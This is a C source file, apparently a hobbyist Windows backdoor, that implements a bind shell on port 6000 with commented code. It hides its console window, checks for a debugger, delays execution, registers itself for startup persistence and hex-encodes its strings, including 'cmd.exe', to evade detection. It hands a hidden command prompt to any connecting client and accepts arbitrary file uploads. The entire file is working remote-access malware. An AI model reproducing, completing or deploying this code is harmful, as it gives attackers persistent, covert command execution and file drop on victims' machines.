#include "anti-debug.h"
#include "reg.h"

#pragma comment(lib, "ws2_32.lib")

//our variables, we need them globally to use them in all functions
char bufferin[1024]; //the buffer to read data from socket
char bufferout[65535]; //the buffer to write data to the socket
int i, port; // i is used for loop , port is going to keep the portnumber
SOCKET locsock, remsock;  //the sockets we are going to need
SOCKADDR_IN sinloc, sinrem; //the structures needed for our sockets
WSADATA wsadata; //wsadata
STARTUPINFO startinfo; //startupinfo structure for CreateProcess
SECURITY_ATTRIBUTES secat; //security attributes structure needed for CreateProcess
PROCESS_INFORMATION procinfo; //process info struct needed for CreateProcess
int bytesWritten;  //number of bytes written gets stored here
DWORD bytesRead, avail, exitcode; //number of bytes read, number of bytes available
//and the exitcode
void CommandPrompt(void);       //the function to give the command prompt
void handle_upload(SOCKET sock); //the function to handle file uploads

int main() //the main function
{
    //hide console
   FreeConsole();
    //check if debugger is present
   if (BugCheck()) {
		return EXIT_FAILURE;
	}

   //sleep for 30 seconds
   Sleep(30000);

   //add to startup
    Start();
    //set listen port
    port = 6000;
    //tell windows we want to use sockets
    WSAStartup(0x101, &wsadata);
    //create socket
    locsock = socket(AF_INET, SOCK_STREAM, 0);

    //fill structure
    sinloc.sin_family = AF_INET;
    sinloc.sin_addr.s_addr = INADDR_ANY;
    sinloc.sin_port = htons(port);

    //bind the socket to the specified port
    if (bind(locsock, (SOCKADDR*)&sinloc, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
        WSACleanup();
        printf("\x45\x72\x72\x6f\x72\x20\x62\x69\x6e\x64\x69\x6e\x67\x20\x73\x6f\x63\x6b\x65\x74\x2e\x0a");
        return EXIT_FAILURE;
    }

    //listen on the specified socket
    if (listen(locsock, 5) == SOCKET_ERROR)
    {
        WSACleanup();
        printf("\x45\x72\x72\x6f\x72\x20\x6c\x69\x73\x74\x65\x6e\x69\x6e\x67\x20\x73\x6f\x63\x6b\x65\x74\x2e\x0a");
        return EXIT_FAILURE;
    }

    //infinite loop here to keep the program listening
    while (1)
    {
        remsock = SOCKET_ERROR;
        while (remsock == SOCKET_ERROR)
        {
            //accept connection to our program
            remsock = accept(locsock, NULL, NULL);
            if (remsock == INVALID_SOCKET)
            {
                //cleanup and exit program
                WSACleanup();
                printf("\x45\x72\x72\x6f\x72\x20\x61\x63\x63\x65\x70\x74\x69\x6e\x67\x20\x73\x6f\x63\x6b\x65\x74\x2e");
                return EXIT_FAILURE;
            }

            CommandPrompt(); //start the commandprompt function
        }
        closesocket(remsock); //close the socket
    }
    //we should never reach this point, but i've put this hear just in case 😉
    return EXIT_SUCCESS;
}

//*************************************************************
void CommandPrompt(void) //the function which handles the complete commandprompt
{
    secat.nLength = sizeof(SECURITY_ATTRIBUTES);
    secat.bInheritHandle = TRUE;
    DWORD bytesW;             //number of bytes written gets stored here
    HANDLE newstdin, newstdout, readout, writein; //the handles for our Pipes
    char exit1[] = { 'e','x','i','t',10,0 }; //we need this to compare our command to 'exit'
    char exit2[] = { 'E','X','I','T',10,0 }; //we need this to compare our command to 'EXIT'

    //create the pipes for our command prompt
    CreatePipe(&newstdin, &writein, &secat, 0);
    CreatePipe(&readout, &newstdout, &secat, 0);

    GetStartupInfo(&startinfo);

    //fill another structure
    startinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startinfo.wShowWindow = SW_HIDE;
    startinfo.hStdOutput = newstdout;
    startinfo.hStdError = newstdout;
    startinfo.hStdInput = newstdin;

    wchar_t cmd[] = L"\x63\x6d\x64\x2e\x65\x78\x65"; //the command we want to start

    //start cmd prompt
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &procinfo)) {
        printf("\x43\x72\x65\x61\x74\x65\x50\x72\x6f\x63\x65\x73\x73\x20\x66\x61\x69\x6c\x65\x64\x20\x28\x25\x64\x29\x2e\x0a", GetLastError());
        return;
    }

    //endless loop
    while (1)
    {
        //check if cmd.exe is still running, if not then cleanup and start listening again.
        if (GetExitCodeProcess(procinfo.hProcess, &exitcode) == STILL_ACTIVE)
        {
            CloseHandle(procinfo.hThread);
            CloseHandle(procinfo.hProcess);
            CloseHandle(newstdin);
            CloseHandle(writein);
            CloseHandle(readout);
            CloseHandle(newstdout);
            break;
        }
        bytesRead = 0;
        //Sleep 0.5 seconds to give cmd.exe the chance to startup
        Sleep(500);
        //check if the pipe already contains something we can write to output
        PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
        if (bytesRead != 0)
        {
            while (bytesRead != 0)
            {     //read data from cmd.exe and send to client, then clear the buffer
                int res = ReadFile(readout, bufferout, sizeof(bufferout), &bytesRead, NULL);
                send(remsock, bufferout, strlen(bufferout), 0);
                ZeroMemory(bufferout, sizeof(bufferout));
                Sleep(100);
                PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
            }
        }
        // clear bufferin
        ZeroMemory(bufferin, sizeof(bufferin));
        //receive the command given
        recv(remsock, bufferin, sizeof(bufferin), 0);

        if (strncmp(bufferin, "\x75\x70\x6c\x6f\x61\x64", 6) == 0) {
            handle_upload(remsock);
            continue;
        }

        //if command is 'exit' or 'EXIT' then we have to capture it to prevent our program
        //from hanging.
        if ((strcmp(bufferin, exit1) == 0) || (strcmp(bufferin, exit2) == 0))
        {
            //let cmd.exe close by giving the command, then go to closeup label
            WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
            goto closeup;
        }
        //else write the command to cmd.exe
        WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
        // clear bufferin
        ZeroMemory(bufferin, sizeof(bufferin));
    }
    //close up all handles
closeup:
    if (procinfo.hThread != NULL) {
        CloseHandle(procinfo.hThread);
        procinfo.hThread = NULL;
    }
    if (procinfo.hProcess != NULL) {
        CloseHandle(procinfo.hProcess);
        procinfo.hProcess = NULL;
    }
    if (newstdin != NULL) {
        CloseHandle(newstdin);
        newstdin = NULL;
    }
    if (writein != NULL) {
        CloseHandle(writein);
        writein = NULL;
    }
    if (readout != NULL) {
        CloseHandle(readout);
        readout = NULL;
    }
    if (newstdout != NULL) {
        CloseHandle(newstdout);
        newstdout = NULL;
    }
}

void handle_upload(SOCKET sock) {
    char name[256];
    int received;

    // Clear the buffer and receive the filename
    ZeroMemory(bufferin, sizeof(bufferin));
    if (recv(sock, name, sizeof(name), 0) <= 0) {
        send(sock, "\x45\x72\x72\x6f\x72\x20\x72\x65\x63\x65\x69\x76\x69\x6e\x67\x20\x66\x69\x6c\x65\x6e\x61\x6d\x65\x0a", strlen("\x45\x72\x72\x6f\x72\x20\x72\x65\x63\x65\x69\x76\x69\x6e\x67\x20\x66\x69\x6c\x65\x6e\x61\x6d\x65\x0a"), 0);
        return;
    }

    // Remove newline character if present
    char* newline = strchr(name, '\n');
    if (newline) {
        *newline = '\0';
    }
    // Open the file for writing
    FILE* fp = fopen(name, "wb");
    if (fp == NULL) {
        send(sock, "\x45\x72\x72\x6f\x72\x20\x6f\x70\x65\x6e\x69\x6e\x67\x20\x66\x69\x6c\x65\x20\x66\x6f\x72\x20\x77\x72\x69\x74\x69\x6e\x67\x0a", strlen("\x45\x72\x72\x6f\x72\x20\x6f\x70\x65\x6e\x69\x6e\x67\x20\x66\x69\x6c\x65\x20\x66\x6f\x72\x20\x77\x72\x69\x74\x69\x6e\x67\x0a"), 0);
        return;
    }
    send(sock, "\x46\x69\x6c\x65\x20\x63\x72\x65\x61\x74\x65\x64\x0a", strlen("\x46\x69\x6c\x65\x20\x63\x72\x65\x61\x74\x65\x64\x0a"), 0);

    // Receive the file content
    char stop[] = "\x73\x74\x6f\x70\x20\x75\x70\x6c\x6f\x61\x64";
    while ((received = recv(sock, bufferin, sizeof(bufferin), 0)) > 0) {
        if (strstr(bufferin, "\x73\x74\x6f\x70\x20\x75\x70\x6c\x6f\x61\x64") != NULL) {
            break;
        }
        fwrite(bufferin, 1, received, fp);
    }
    fclose(fp);

    send(sock, "\x46\x69\x6c\x65\x20\x72\x65\x63\x65\x69\x76\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x0a", strlen("\x46\x69\x6c\x65\x20\x72\x65\x63\x65\x69\x76\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79\x0a"), 0);
}